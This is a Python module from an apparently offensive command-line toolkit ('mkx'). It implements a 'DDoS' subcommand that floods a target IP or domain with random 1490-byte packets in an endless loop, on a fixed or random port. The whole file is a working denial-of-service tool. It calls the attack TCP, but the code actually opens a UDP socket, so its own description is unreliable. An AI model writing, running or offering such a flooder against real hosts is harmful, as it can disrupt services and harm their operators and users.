import random as random_m
import socket
from datetime import datetime
from typing import Annotated

import typer
from prompt_toolkit.shortcuts import yes_no_dialog

from mkx.core.colors import BOLD, GREEN, RED, RESET, YELLOW
from mkx.core.helps import DDOS_TCP_HELP

# WARNING: Running rich color printing during the attack causes a significant
# performance loss, which is why the ANSI character method was adopted.

command = typer.Typer(
    help='Perform targeted DDoS attacks on devices.',
    no_args_is_help=True,
)


@command.command(
    help=DDOS_TCP_HELP,
    short_help='Sends arbitrary packets via TCP to the device causing CPU overload.',
)
def tcp(
    target: Annotated[str, typer.Argument(help='Target IP address or domain.')],
    port: Annotated[int, typer.Argument(help='TCP port to be attacked.')] = 80,
    random: Annotated[
        bool,
        typer.Option('--random', '-r', help='Attacks random ports between 1 and 65534.'),
    ] = False,
    verbose: Annotated[
        bool,
        typer.Option('--verbose', '-v', help='Enable verbosity.'),
    ] = False,
):
    confirm = yes_no_dialog(
        title='Confirm this action',
        text=f'Do you want to perform a DDoS attack via TCP against target {target}?',
    ).run()

    if not confirm:
        print(f'{BOLD}{GREEN}[{RESET}{BOLD}{YELLOW}*{RESET}{BOLD}{GREEN}]{RESET} Aborting')
        return

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random_m._urandom(1490)
    target = socket.gethostbyname(target)

    print(
        f'{BOLD}{YELLOW}[{RESET}'
        f'{BOLD}{RED}+{RESET}'
        f'{BOLD}{YELLOW}]{RESET}'
        f' Attacking the target {BOLD}{RED}{target}{RESET}'
    )
    print(
        f'{BOLD}{YELLOW}[{RESET}'
        f'{BOLD}{RED}+{RESET}'
        f'{BOLD}{YELLOW}]{RESET}'
        f' Prees {BOLD}{RED}Ctrl{RESET}'
        f'+{BOLD}{RED}C{RESET} to stop'
    )

    sent = 0
    start_time = datetime.now()
    while True:
        try:
            if random:
                port = random_m.randrange(1, 65535)

            sock.sendto(bytes, (target, port))
            sent += 1
            if verbose:
                print(
                    f'{BOLD}{RED}[{RESET}'
                    f'{BOLD}{YELLOW}*{RESET}'
                    f'{BOLD}{RED}]{RESET}'
                    f' Sent {BOLD}{RED}{sent}{RESET} '
                    f'to traget {BOLD}{RED}{target}{RESET}'
                    f':{BOLD}{RED}{port}{RESET}'
                )
        except KeyboardInterrupt:
            print(f'\n{BOLD}{GREEN}[{RESET}{BOLD}{YELLOW}-{RESET}{BOLD}{GREEN}]{RESET} Stopping')
            end_time = datetime.now()
            break
    execution_time = end_time - start_time
    print(
        f'{BOLD}{GREEN}[{RESET}'
        f'{BOLD}{YELLOW}+{RESET}'
        f'{BOLD}{GREEN}]{RESET}'
        f' The attack lasted {BOLD}{RED}{execution_time}{RESET} '
        f'and sent {BOLD}{RED}{sent}{RESET} packets'
    )
    typer.Exit(0)
